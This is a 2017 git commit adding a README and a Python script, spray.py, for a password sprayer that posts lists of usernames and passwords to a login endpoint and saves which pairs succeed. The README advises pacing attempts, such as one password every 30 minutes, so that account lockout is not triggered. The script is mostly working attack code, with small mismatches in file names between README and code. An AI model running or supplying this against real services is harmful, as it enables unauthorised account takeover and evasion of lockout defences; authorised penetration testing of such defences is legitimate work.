eba9dd0acba6de3f3edfabd0f6dd573a24ded0be
Andy Dennis <8628078+patamechanix@users.noreply.github.com>
2017-09-27 14:21:21 -0400

    Added skeleton files

--- README.md
+++ README.md
@@ -1,2 +1,70 @@
-# python-password-sprayer
+# Python Password Sprayer
+
 Simple password sprayer written in Python
+
+The following tool can be used to test one or more passwords
+against multiple user accounts. 
+
+Generally the  number of passwords tested per script run will
+be enough to not trigger account lock out.
+
+For example you may only wish to sue a single password and run
+the script every 30 mins.
+
+## Configuration
+
+The script uses a YAML script for input paramters. This should be called user.yaml
+and be located in the same folder as the script
+
+Note: This will be made an input param in future releases. 
+
+The input params should be:
+
+* url - the target URL
+* user_field - The name of the user input field the API accepts
+* password_field - The name of the password input field 
+* data - a list of other parameters that may be required by the API/App
+* response - used for recording the response field parameters that indiciate a valid login
+* response_key - nested under response and used for the key to check for a valid/invalid message
+* valid_response - nested under response, the value returned that confirm the a successful login.
+* users - a list of users
+* passwords - a list of passwords to use
+
+The following YAML demonstrates the above:
+
+```
+url: "http://some.website/api/v1/login"
+user_field: "userName"
+password_field: "passWord"
+
+data: null
+
+response:
+    response_key: message
+    valid_response: "Password incorrect"
+
+users:
+- bsmith@blah.com
+- jbloggs@blah.com
+
+passwords:
+- passw0rd1234
+
+```
+
+
+## Operation
+
+Run the script with:
+
+```
+python spray.py 
+
+```
+
+
+Once complete two YAML output files will be generated.
+
+valid_logins.yaml - a list of valid usernames/password logins
+
+invalid_loginss - a list of usernames/passwords that failed
---
+++ spray.py
@@ -0,0 +1,123 @@
+
+import requests
+import json
+import yaml
+
+
+class PasswordSprayer():
+    """"
+    Class that takes input from
+    a YAML file and then attempts to
+    ascertain if a user account is
+    valid on target application
+    """
+
+    valid_logins = {'users_pwd':[]}
+    invalid_logins = {'users_pwd':[]}
+    yamldump = {}
+    user_field = ""
+    password_field = ""
+    data = {}
+    url = ""
+    response_key = ""
+    valid_response = ""
+
+    def __init__(self):
+        """
+        Kick off the application
+        """
+        self.load_yaml()
+        self.load_params()
+        self.dump_yaml_output()
+
+
+    def load_yaml(self):
+        """"
+        Load params from
+        a YAML document
+        """
+        opendoc = open("users.yaml", "r")
+        self.yamldump = yaml.load_all(opendoc)
+
+
+    def load_params(self):
+        """
+        Load parameters
+        from yamldump
+        """ 
+        
+        for key in self.yamldump:
+        
+            self.data = {}
+            self.user_field = key['user_field']
+            self.password_field = key['password_field']
+            self.response_key = key['response']['response_key']
+            self.valid_response = key['response']['valid_response']
+            self.url = key['url']
+            self.data[self.user_field] = ""
+        
+            if key['data'] and key['data'] != None:
+                data_vals = key['data']
+                for k in data_vals:
+                    self.data[k] = data_vals[k]
+            
+            if key['users'] and key['passwords']: 
+                users_list = key['users']
+                passwords_list = key['passwords'] 
+                self.check_for_valid_logins(users_list, passwords_list) 
+ 
+
+
+    def check_for_valid_logins(self, users_list, passwords_list):
+        """
+        Using input parameters
+        test target url/api
+        with user + password
+        to see if valid login
+        """         
+        
+        
+        for u in users_list:
+        
+            self.data[self.user_field] = u
+
+            for p in passwords_list:
+
+                self.data[self.password_field] = p
+
+                print "Trying password " + str(p)
+                print "For user " + str(u)
+                r = requests.post(self.url, data=self.data) 
+        
+                dictdata = json.loads(r.text)
+
+                if dictdata[self.response_key] == self.valid_response: 
+            
+                    print "Status code is: "+str(r.status_code) 
+                    print "Response message is: "+str(r.reason)
+                    print "Valid password: "+p 
+                    self.valid_logins['users_pwd'].append({'user':u,'password':p})
+                    break
+ 
+                else:
+                    print "Response message is: "+str(dictdata[self.response_key])
+                    self.invalid_logins['users_pwd'].append({'user':u,'password':p})
+        
+
+    def dump_yaml_output(self):
+        """
+        Dump a lsit of valid and
+        invalid login attempts to two separate
+        docs
+        """
+        valid_logins_doc = file('valid_logins.yaml', 'w')
+        yaml.dump(self.valid_logins, valid_logins_doc, default_flow_style=False)
+        
+        invalid_logins_doc = file('invalid_users.yaml', 'w')
+        yaml.dump(self.invalid_logins, invalid_logins_doc, default_flow_style=False)
+
+
+
+if __name__ == "__main__":
+    password_sprayer = PasswordSprayer()
+ 
